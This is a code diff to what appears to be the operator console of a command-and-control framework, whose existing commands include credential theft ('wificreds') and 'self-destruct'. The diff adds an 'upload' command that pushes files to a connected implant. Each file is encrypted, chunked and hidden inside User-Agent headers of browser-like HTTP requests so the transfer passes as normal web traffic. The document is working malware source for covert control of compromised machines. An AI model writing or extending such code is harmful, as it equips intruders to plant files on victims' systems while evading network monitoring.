@@ -157,6 +157,44 @@ def taskCommand(cmd):
             "download:") or cmd.startswith("wificreds:") or cmd.startswith("self-destruct:"):
         cmd = cmd
 
+    # File upload logic
+    if cmd.startswith("upload:"):
+        try:
+            requestedFile = cmd.split("upload:")[1]
+            with open(requestedFile, 'rb') as binary_file:
+                binary_file_data = binary_file.read()
+                b64 = base64.b64encode(binary_file_data)
+            binary_file.close()
+            placeholder = encrypt(b64)
+            split = [placeholder[i:i + 7000] for i in range(0, len(placeholder), 7000)]
+            length = len(split)
+            if len(split) >= 49:
+                print(Fore.RED + "[-]" + Fore.RESET + " File is too large to upload")
+                return
+            lengthwarn = "uploadingfile:" + str(length) + ":" + requestedFile
+            print (Fore.BLUE + "[!]" + Fore.RESET + " Uploading file in: " + str(length) + " chunks")
+            warining = base64.b64encode(lengthwarn.encode('UTF-8'))
+            warining = encrypt(warining)
+            headers = {"User-Agent": warining,
+                       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                       "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
+                       "Upgrade-Insecure-Requests": "1"}
+            response = requests.get(url, headers=headers)
+            time.sleep(3)
+            for i in split:
+                headers = {"User-Agent": i,
+                           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                           "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
+                           "Connection": "close",
+                           "Upgrade-Insecure-Requests": "1"}
+                response = requests.get(url, headers=headers)
+            print(Fore.BLUE + "[!]" + Fore.RESET + " File uploaded successfully!")
+
+        except:
+            print("[-] Error uploading file file")
+            return
+        ########-End file upload logic-##########################
+
     else:
         cmd = "task:" + cmd
 
@@ -849,6 +887,22 @@ def main():
                         time.sleep(1)
                         taskCommand("download:" + requestedfile)
                         lastdictsize = getResults(lastdictsize)
+                    else:
+                        print(
+                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+
+                elif cmd.startswith("upload "):
+                    if connected:
+                        requestedfile = cmd.split("upload ")[1]
+                        if os.path.exists(requestedfile):
+                            fallback()
+                            time.sleep(1)
+                            taskCommand("upload:" + requestedfile)
+                            print(Fore.BLUE + "[!]" + Fore.RESET + " Fallbacking after upload...")
+                            time.sleep(1)
+                            fallback()
+                        else:
+                            print(Fore.RED + "[-]" + Fore.RESET + " File not found\n")
                     else:
                         print(
                             Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
